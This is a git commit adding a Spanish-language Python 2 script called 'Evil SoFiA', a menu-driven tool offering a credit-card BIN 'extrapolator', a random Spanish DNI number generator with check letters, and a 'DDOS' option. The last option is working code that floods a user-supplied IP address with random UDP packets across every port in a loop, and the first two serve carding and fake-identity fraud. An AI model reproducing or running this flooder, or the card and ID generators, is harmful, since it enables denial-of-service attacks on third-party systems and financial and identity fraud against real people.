23b549dd346348a587ffe5e32251ec4acbc5df47
EMILIO BARROSO <46255868+emiliobog@users.noreply.github.com>
2019-07-26 22:28:13 -0600

    Add files via upload

---
+++ Sofia.py
@@ -0,0 +1,218 @@
+#Evil SoFiA 
+import re
+import time 
+from random import choice
+import sys
+
+vrs = ' 1.9.1'
+time.sleep(0.5)
+import os
+
+hostname = "www.google.com"
+response = os.system("ping -f " + hostname)
+if response == 0:
+    print "Hay conexion suficiente uwu"
+else:
+    print "No hay conexion suficiente unu"
+    exit()
+ax = os.system 
+ax("cls")
+ax("color 4 ")
+ols = time.strftime("%H:%M:%S")
+print time.strftime("                     %I:%M:%S") 
+if ols > "23:30":
+    print "EVIL SOFIA SE ESTA ACTUALIZANDO!..."
+    exit()
+else:
+    print " "
+
+print '''
+    ___ _   _  _ _      __   __  ___ _  __   
+   | __| \ / || | |   /' _/ /__\| __| |/  \  
+   | _|`\ V /'| | |_  `._`.| \/ | _|| | /\ | 
+   |___| \_/  |_|___| |___/ \__/|_| |_|_||_|  
+'''
+time.sleep(1.4)
+ax("title EVIL SOFIA")
+print "         Emmanuel Milos" + "|" + "Emilio Barroso"
+print "         ~EXTRAPOLADOR Y GENERADOR SOFIA~" 
+print '''
+  
+'''
+
+while True:
+    print("      .:MENU:.")
+    print("   1.EXTRAPOLADOR")
+    print("   2.GENERADOR DE DNI")
+    print("   3.ATAQUE DDOS[BETA]")
+    print("   4.SALIR ")
+    print("")
+    opc = input("  Digite el numero de la opcion: ")
+
+
+    if opc == 1:
+        Bin = int(input("Digite los primeros 8 digitos del Bin: "))
+        lista = []
+        Intro = lista.append(Bin)
+
+        #Primer Bin
+        bin11 = int(input("Introduce el digito numero DIEZ del primer Bin: "))
+        if bin11 >= 0 and bin11 <= 9:
+            print("")
+        else:
+            print("Introduce un numero correcto :)")
+            bin11 = int(input("Vuelve a introducir el digito: "))
+
+        bin12 = int(input("Introduce el digito numero ONCE del primer Bin: "))
+        if bin12 >= 0 and bin12 <= 9:
+            print("")
+        else:
+            print("Introduce un numero correcto :)")
+            bin12 = int(input("Introduce el digito numero ONCE del primer Bin: "))
+
+        #Segundo Bin
+
+        bin21 = int(input("Introduce el digito numero DIEZ del segundo Bin: "))
+        if bin21 >= 0 and bin21 <=9:
+            print("")
+        else:
+            print("Introduce un numero correcto :)")
+            bin21 = int(input("Vuelve a introducir el digito: "))
+
+        bin22 = int(input("Introduce el digito numero ONCE del segundo Bin: "))
+        if bin22 >= 0 and bin22 <=9:
+            print("")
+        else:
+            print("Introduce un numero correcto :)")
+            bin22 = int(input("Introduce el digiro numero ONCE del segundo Bin: "))
+
+        #Algoritmo
+
+        A = int(bin11 + bin21 / 2) * 5
+        B = int(bin12 + bin22 / 2) * 5
+        C = A + B
+
+        #Agregar los digitos
+
+        Intro2 = lista.append(C)
+        print("Tu extrapolacion es: ")
+        time.sleep(0.8)
+        print("".join(repr(e) for e in lista))
+        print("")
+        time.sleep(2)
+
+    elif opc==2:
+        #LAST DNI GEN
+        import time
+        
+        from random import randint
+        os.system("title LAST")
+        os.system("cls")
+        os.system("color 4")
+        print time.strftime("               %I:%M:%S")
+        print'''
+    
+$$\        $$$$$$\   $$$$$$\ $$$$$$$$\ 
+$$ |      $$  __$$\ $$  __$$\\__$$  __|
+$$ |      $$ /  $$ |$$ /  \__|  $$ |   
+$$ |      $$$$$$$$ |\$$$$$$\    $$ |   
+$$ |      $$  __$$ | \____$$\   $$ |   
+$$ |      $$ |  $$ |$$\   $$ |  $$ |   
+$$$$$$$$\ $$ |  $$ |\$$$$$$  |  $$ |   
+\________|\__|  \__| \______/   \__|   
+                                       
+                                                                 
+            '''
+        dni=range(1,9)
+        print("   Emmanuel Milos|Emilio Barroso")
+
+        i=0
+
+        while i<len(dni):
+            for elento in dni:
+               dni[i]=randint(1,9)
+            i+=1
+
+
+    
+        dni2=x=''.join(map(str,dni))
+
+        print ' '
+        time.sleep(2)
+        print ("          Generando DNI...")
+        time.sleep(3)
+        print '''
+
+        '''
+        def ra():
+            numero = dni2
+
+            intnumero = int(numero)
+
+            letra1 = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+
+            resto = intnumero%23
+
+            letra = letra1[resto]
+            print '   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%'
+            print '   %        ' + numero,  "-", letra + '       %'
+            print'   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%'
+            print " "
+
+        ra()
+
+        raw_input("Presiona Enter Para Salir De El Gen")
+        os.system("color 0")
+    elif opc==3: 
+        import socket
+        import random
+        from datetime import datetime
+        now = datetime.now()
+        hour = now.hour
+        minute = now.minute
+        day = now.day
+        month = now.month
+        year = now.year
+
+        ##############
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        bytes = random._urandom(1490)
+        #############
+
+        os.system("cls")
+        print '''
+
+ _  _  _  __    _ ______ _  __   
+| \| \/ \(_    |_| |  | |_|/  |/ 
+|_/|_/\_/__)   | | |  | | |\__|\ 
+
+                                                              
+        '''
+        ip = raw_input("IP Target : ")
+        port = input("Port       : ")
+
+        os.system("cls")
+        os.system("echo INICIANDO ATAQUE! ")
+        print "[                    ] 0% "
+        time.sleep(5)
+        print "[=====               ] 25%"
+        time.sleep(5)
+        print "[==========          ] 50%"
+        time.sleep(5)
+        print "[===============     ] 75%"
+        time.sleep(5)
+        print "[====================] 100%"
+        time.sleep(3)
+        sent = 0
+        while True:
+             sock.sendto(bytes, (ip,port))
+             sent = sent + 1
+             port = port + 1
+             print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+             if port == 65534:
+                port = 1
+                break;
+    elif opc==4:
+        print ("Gracias por Utlizar SoFiA")
+        break;
+        exit()
